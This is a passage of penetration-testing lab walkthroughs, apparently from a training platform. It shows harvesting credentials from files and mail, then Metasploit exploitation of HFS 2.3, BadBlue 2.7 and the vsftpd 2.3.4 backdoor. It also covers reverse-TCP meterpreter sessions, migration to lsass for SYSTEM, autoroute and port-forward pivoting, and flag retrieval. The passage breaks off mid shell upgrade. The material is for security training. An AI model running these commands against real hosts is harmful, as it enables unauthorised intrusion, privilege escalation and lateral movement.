john:x:1001:1001:,,,:/home/john:/bin/bash ←
dany:x:1002:1002:,,,:/home/dany:/bin/bash ←
bronn:x:1003:1003:,,,:/home/bronn:/bin/bash ←
robert:x:1004:1004:,,,:/home/robert:/bin/bash ←
bran:x:1005:1005:,,,:/home/bran:/bin/bash
sansa:x:1006:1006:,,,:/home/sansa:/bin/bash ←
```

`ls -alps /home/kate`:
```
total 24
4 drwxr-xr-x 1 bronn bronn 4096 Apr 24  2019 ./
8 drwxr-xr-x 1 root  root  4096 Apr 24  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 bronn bronn  655 Apr 24  2019 .profile
```

`ls -alps /home/john`:
```
total 24
4 drwxr-xr-x 1 bronn bronn 4096 Apr 24  2019 ./
8 drwxr-xr-x 1 root  root  4096 Apr 24  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 bronn bronn  655 Apr 24  2019 .profile
```

`ls -alps /home/bronn`:
```
total 24
4 drwxr-xr-x 1 bronn bronn 4096 Apr 24  2019 ./
8 drwxr-xr-x 1 root  root  4096 Apr 24  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 bronn bronn  655 Apr 24  2019 .profile
```

`ls -alps /home/robert`:
```
total 24
4 drwxr-xr-x 1 bronn bronn 4096 Apr 24  2019 ./
8 drwxr-xr-x 1 root  root  4096 Apr 24  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 bronn bronn  655 Apr 24  2019 .profile
```

`ls -alps /home/sansa`:
```
total 24
4 drwxr-xr-x 1 bronn bronn 4096 Apr 24  2019 ./
8 drwxr-xr-x 1 root  root  4096 Apr 24  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 bronn bronn  655 Apr 24  2019 .profile
```

`ls -alps /home/dany`:
```
total 28
4 drwxr-xr-x 1 dany dany 4096 May  2  2019 ./
8 drwxr-xr-x 1 root root 4096 Apr 24  2019 ../
4 -rw-r--r-- 1 dany dany  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 dany dany 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 dany dany  655 Apr 24  2019 .profile
4 -rw-r--r-- 1 root root   12 May  2  2019 credentials.txt ←
```

`cat /home/dany/credentials.txt`:
```
ce16384290b ←
```

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

`ssh dany@target-1`:
```
dany@target-1's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

```

<span style="color: #64b5f6;">**Target (target-1) machine - `dany` user - flag2**</span>.

`whoami`:
```
dany ←
```

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 1 dany dany 4096 Aug 21 15:09 ./
8 drwxr-xr-x 1 root root 4096 Apr 24  2019 ../
4 -rw-r--r-- 1 dany dany  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 dany dany 3771 Apr 24  2019 .bashrc
4 drwx------ 2 dany dany 4096 Aug 21 15:09 .cache/
4 -rw-r--r-- 1 dany dany  655 Apr 24  2019 .profile
4 -r-x------ 1 dany dany   40 Apr 24  2019 flag.txt ←
```

`cat ./flag.txt`:
```
Flag2: f0af063e22b83fda17710cb18efb591b ←
```

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

`ssh bronn@target-4`:
```
bronn@target-4's password: ←
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

You have mail. ←
```

<span style="color: #64b5f6;">**Target (target-4) machine - `bronn` user - flag6**</span>.

`whoami`:
```
bronn ←
```

`ls -alps ./`:
```
total 36
4 drwxr-xr-x 1 bronn bronn 4096 Aug 21 15:18 ./
8 drwxr-xr-x 1 root  root  4096 Apr 24  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 Apr 24  2019 .bashrc
4 drwx------ 2 bronn bronn 4096 Aug 21 15:18 .cache/
4 -rw-r--r-- 1 bronn bronn  655 Apr 24  2019 .profile
4 drwxr-xr-x 2 root  root  4096 Apr 24  2019 .ssh/
4 -rw-r--r-- 1 root  root    40 Apr 24  2019 flag.txt ←
```

`cat ./flag.txt`:
```
Flag6: 4050f55886f6cd0827d7e4286bd5bbee ←
```

`cat /etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
bronn:x:1000:1000:,,,:/home/bronn:/bin/bash
robert:x:1001:1001:,,,:/home/robert:/bin/bash ←
```

`env`:
```
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=192.1.28.2 53852 22
SSH_TTY=/dev/pts/0
USER=bronn
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha
=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01
;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm
=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;
35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=0
1;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
MAIL=/var/mail/bronn ←
PATH=/home/bronn/bin:/home/bronn/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
PWD=/home/bronn
SHLVL=1
HOME=/home/bronn
LOGNAME=bronn
SSH_CONNECTION=192.1.28.2 53852 192.1.28.6 22
_=/usr/bin/env
```

`cat /var/mail/bronn`:
```
From root@localhost  Tue Nov 28 16:21:49 2018
Return-Path: <root@localhost>
X-Original-To: bronn@localhost
Delivered-To: bronn@localhost
Received: from localhost (unknown [127.0.0.1])
        by localhost (Postfix) with SMTP id C776713EA0CB
        for <bronn@localhost>; Tue, 28 Nov 2018 16:21:23 +0000 (UTC)
Subject: Another user account for you !!

Hi bronn,

Here are the credentials for your additional user account:

Username: robert ←

Password: 449d4b2ce ←


Thanks!

Regards,
Root
```

`su robert`:
```
Password: ←
```

<span style="color: #64b5f6;">**Target (target-4) machine - `robert` user - flag7**</span>.

`cd /home/robert`

`ls -alps ./`:
```
total 28
4 drwxr-xr-x 1 robert robert 4096 Apr 24  2019 ./
8 drwxr-xr-x 1 root   root   4096 Apr 24  2019 ../
4 -rw-r--r-- 1 robert robert  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 robert robert 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 robert robert  655 Apr 24  2019 .profile
4 -r-x------ 1 robert robert   40 Apr 24  2019 flag.txt ←
```

`cat ./flag.txt `:
```
Flag7: f0af063e22b8377777710cb18efb591b ←
```

---

## Pivoting

### Pivoting and Port Forwarding with Metasploit - Lab

#### Lab Environment

This lab focuses on the concept of pivoting, a crucial technique in penetration testing that allows an attacker to move from one compromised system to another within the same network. By exploiting vulnerabilities on the initial target, you will gain access and then pivot to exploit and access a secondary target.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machines will be accessible at `demo1.ine.local` and `demo2.ine.local`.

**Objective:** Exploit vulnerabilities in the target machines to gain access and retrieve a flag.

The best tools for this lab are:
	- Nmap
	- searchsploit
	- msfconsole.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback                                                                                                                          
fe00::0 ip6-localnet                                                                                                                                                 
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.9        INE
127.0.0.1 AttackDefense-Kali
10.10.50.3      INE
10.4.21.248    demo1.ine.local ←
10.4.18.110    demo2.ine.local ←
```

`ping -c 3 demo1.ine.local`:
```
PING demo1.ine.local (10.4.21.248) 56(84) bytes of data.
64 bytes from demo1.ine.local (10.4.21.248): icmp_seq=1 ttl=125 time=11.1 ms
64 bytes from demo1.ine.local (10.4.21.248): icmp_seq=2 ttl=125 time=9.70 ms
64 bytes from demo1.ine.local (10.4.21.248): icmp_seq=3 ttl=125 time=9.81 ms

--- demo1.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms ←
rtt min/avg/max/mdev = 9.697/10.217/11.143/0.656 ms
```

`ping -c 3 demo2.ine.local`:
```
PING demo2.ine.local (10.4.18.110) 56(84) bytes of data.

--- demo2.ine.local ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2063ms ←
```

`nmap -Pn -sS -sV demo1.ine.local -p-`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 23:35 IST
Nmap scan report for demo1.ine.local (10.4.21.248)
Host is up (0.010s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3 ←
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
49175/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.82 seconds
```

`searchsploit hfs 2.3`:
```
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                              | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                              | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                   | windows/remote/34926.rb ←
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                           | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                      | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                      | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                 | windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.9  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:09  txqueuelen 0  (Ethernet)
        RX packets 1679  bytes 155790 (152.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1307  bytes 2287256 (2.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.50.3  netmask 255.255.255.0  broadcast 10.10.50.255 ←
        ether 02:42:0a:0a:32:03  txqueuelen 0  (Ethernet)
        RX packets 11  bytes 866 (866.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 7622  bytes 8928686 (8.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7622  bytes 8928686 (8.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`msfconsole -q`

`search hfs`, `use exploit/windows/http/rejetto_hfs_exec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.50.3`, `set LPORT 4444`, `set RHOSTS demo1.ine.local`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.50.3:4444 
[*] Using URL: http://10.10.50.3:8080/Y0JqqRw17FKZn
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /Y0JqqRw17FKZn
[*] Sending stage (176198 bytes) to 10.4.21.248
[!] Tried to delete %TEMP%\nRXELt.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.50.3:4444 -> 10.4.21.248:49235) at 2024-08-21 23:39:25 +0530 ←
```

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim 1) machine**</span>.

`getuid`:
```
Server username: WIN-OMCNBKR66MN\Administrator ←
```

`sysinfo`:
```
Computer        : WIN-OMCNBKR66MN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

`migrate -N lsass.exe`:
```
[*] Migrating from 1856 to 676...
[*] Migration completed successfully. ←
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

`ipconfig`:
```
Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 0e:81:9f:a4:fe:d5
MTU          : 9001
IPv4 Address : 10.4.21.248 ←
IPv4 Netmask : 255.255.240.0 ←
IPv6 Address : fe80::c599:1546:b613:2679
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 24
============
Name         : Microsoft ISATAP Adapter #2
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a04:15f8
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

`route`:
```
IPv4 network routes
===================

    Subnet           Netmask          Gateway      Metric  Interface
    ------           -------          -------      ------  ---------
    0.0.0.0          0.0.0.0          10.4.16.1    10      12
    10.4.16.0        255.255.240.0    10.4.21.248  266     12 ←
    10.4.21.248      255.255.255.255  10.4.21.248  266     12
    10.4.31.255      255.255.255.255  10.4.21.248  266     12
    127.0.0.0        255.0.0.0        127.0.0.1    306     1
    127.0.0.1        255.255.255.255  127.0.0.1    306     1
    127.255.255.255  255.255.255.255  127.0.0.1    306     1
    169.254.169.123  255.255.255.255  10.4.16.1    10      12
    169.254.169.249  255.255.255.255  10.4.16.1    10      12
    169.254.169.250  255.255.255.255  10.4.16.1    10      12
    169.254.169.251  255.255.255.255  10.4.16.1    10      12
    169.254.169.253  255.255.255.255  10.4.16.1    10      12
    169.254.169.254  255.255.255.255  10.4.16.1    10      12
    224.0.0.0        240.0.0.0        127.0.0.1    306     1
    224.0.0.0        240.0.0.0        10.4.21.248  266     12
    255.255.255.255  255.255.255.255  127.0.0.1    306     1
    255.255.255.255  255.255.255.255  10.4.21.248  266     12
```

`shell`

`ping -n 3 demo2.ine.local`:
```
Ping request could not find host demo2.ine.local. Please check the name and try again. ←
```

`ping -n 3 10.4.18.110:
```
Pinging 10.4.18.110 with 32 bytes of data:
Reply from 10.4.18.110: bytes=32 time=1ms TTL=128
Reply from 10.4.18.110: bytes=32 time<1ms TTL=128
Reply from 10.4.18.110: bytes=32 time<1ms TTL=128

Ping statistics for 10.4.18.110:
    Packets: Sent = 3, Received = 3, Lost = 0 (0% loss), ←
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

`exit`

`run autoroute -s 10.4.21.0/20`:
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.4.21.0/255.255.240.0...
[+] Added route to 10.4.21.0/255.255.240.0 via 10.4.21.248 ←
[*] Use the -p option to list all active routes
```

`run autoroute -p`:
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.4.21.0          255.255.240.0      Session 1 ←
```

`bg`

<span style="color: #e57373;">**Attacker machine**</span>.

`search portscan`, `use auxiliary/scanner/portscan/tcp`, `show options`, `set RHOSTS demo2.ine.local`, `set PORTS 1-1000`, `run`:
```
[+] 10.4.18.110:          - 10.4.18.110:80 - TCP OPEN ←
[+] 10.4.18.110:          - Scanned 1 of 1 hosts (100% complete)
[+] Auxiliary module execution completed
```

`sessions -i 1`

<span style="color: #64b5f6;">**Target (victim 1) machine**</span>.

`portfwd add -l 1234 -p 80 -r 10.4.18.110`:
```
[*] Forward TCP relay created: (local) :1234 -> (remote) 10.4.18.110:80 ←
```

`portfwd list`:
```
Active Port Forwards
====================

   Index  Local         Remote          Direction
   -----  -----         ------          ---------
   1      0.0.0.0:1234  10.4.18.110:80  Forward ←

1 total active port forwards.
```

`bg`

<span style="color: #e57373;">**Attacker machine**</span>.

`netstat -antp | grep ":1234"`:
```
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      1880/ruby ←
```

`nmap -Pn -sS -sV localhost -p 1234`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 00:03 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000044s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  http    BadBlue httpd 2.7 ←
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.24 seconds
```

`searchsploit badblue 2.7`:
```
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BadBlue 2.72 - PassThru Remote Buffer Overflow                                                                                                           | windows/remote/4784.pl
BadBlue 2.72b - Multiple Vulnerabilities                                                                                                                 | windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit) ←
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

`search badblue 2.7`, `use exploit/windows/http/badblue_passthru`, `set PAYLOAD windows/meterpreter/bind_tcp`, `show options`, `set LPORT 5555`, `set RHOSTS demo2.ine.local`, `exploit`:
```
[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.4.18.110:5555
[*] Sending stage (176198 bytes) to 10.4.18.110
[*] Meterpreter session 2 opened (10.4.21.248:49988 -> 10.4.18.110:5555 via session 1) at 2024-08-22 00:05:19 +0530 ←
```

`sessions`, `sessions -i 2`

<span style="color: #64b5f6;">**Target (victim 2) machine**</span>.

`getuid`:
```
Server username: ATTACKDEFENSE\Administrator ←
```

`sysinfo`:
```
Computer        : ATTACKDEFENSE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

`migrate -N lsass.exe`:
```
[*] Migrating from 4336 to 776...
[*] Migration completed successfully. ←
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

`where /r C:\ "*flag*"`:
```
C:\flag.txt ←
```

`type C:\flag.txt`:
```
c46d12f28d87ae0b92b05ebd9fb8e817 ←
```

### Pivoting with SOCKS Proxy - Lab

#### Lab Environment

In this pivoting challenge, the network architecture is as shown below:
`attacker` ---> `target-1` ---> `target-2`

Your mission is to get the flags kept in flag text files on both `target-1` and `target-2`.

Instructions: 
- The `target-1` should be located at the IP address `192.X.Y.3`.
- Once you compromise `target-1`, you should be able to use that as a pivot to exploit `target-2`.

A webapp is running on `target-2`.
You have managed to get the following credentials for this webapp by using phishing:
- Username :  "admin"
- Password  :  "password".

How to solve this?
- Metasploit is installed on the Kali instance you will get access to.
- All exploitation can happen using Metasploit and Proxychains with third party scripts/tools.
- You are free to use other tools like Nmap for enumeration.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.6        attackdefense.com attackdefense
192.163.154.2   attackdefense.com attackdefense
192.163.154.2     attacker
192.163.154.3     target-1 ←
```

`ping -c 3 target-1`:
```
PING target-1 (192.163.154.3) 56(84) bytes of data.
64 bytes from target-1 (192.163.154.3): icmp_seq=1 ttl=64 time=0.088 ms
64 bytes from target-1 (192.163.154.3): icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from target-1 (192.163.154.3): icmp_seq=3 ttl=64 time=0.042 ms

--- target-1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 86ms ←
rtt min/avg/max/mdev = 0.036/0.055/0.088/0.024 ms
```

`nmap -Pn -sS -sV target-1 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-22 14:19 UTC
Nmap scan report for target-1 (192.163.154.3)
Host is up (0.000023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later ←
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:A3:9A:03 (Unknown)
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds
```

`searchsploit vsftpd`:
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
                                                                                                                                                                                                   | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                                                     | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                                                     | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                                                     | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                                                                   | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                             | exploits/unix/remote/17491.rb ←
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

`sudo service postgresql start`:
```
[ ok ] Starting PostgreSQL 11 database server: main. ←
```

`msfconsole -q`

`search vsftpd`, `use exploit/unix/ftp/vsftpd_234_backdoor`, `show options`, `set RHOSTS target-1`, `exploit`:
```
[*] 192.163.154.3:21 - Banner: 220 Welcome to AttackDefense target FTP service.
[*] 192.163.154.3:21 - USER: 331 Please specify the password.
[+] 192.163.154.3:21 - Backdoor service has been spawned, handling...
[+] 192.163.154.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.163.154.2:43027 -> 192.163.154.3:6200) at 2024-08-22 14:22:09 +0000 ←
```

<span style="color: #64b5f6;">**Target 1 machine**</span>.

`whoami`:
```
root ←
```

`find / -iname "*flag*" 2> /dev/null`:
```
/usr/lib/perl/5.18.2/bits/waitflags.ph
/usr/lib/python2.7/dist-packages/dns/flags.pyc
/usr/lib/python2.7/dist-packages/dns/flags.py
/usr/include/linux/tty_flags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/bin/flag1.txt ←
/usr/bin/dpkg-buildflags
/usr/share/man/man1/dpkg-buildflags.1.gz
/usr/share/man/de/man1/dpkg-buildflags.1.gz
/usr/share/man/man3/Dpkg::BuildFlags.3.gz
/usr/share/man/man3/fesetexceptflag.3.gz
/usr/share/man/man3/fegetexceptflag.3.gz
/usr/share/dpkg/buildflags.mk
/usr/share/perl5/Dpkg/BuildFlags.pm
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
```

`cat /usr/bin/flag1.txt`:
```
6d026e8a09c93a18eca404b834c13991 ←
```

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

`sessions`:
```
Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.163.154.2:43027 -> 192.163.154.3:6200 (192.163.154.3) ←
```

`sessions -u 1`:
```
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
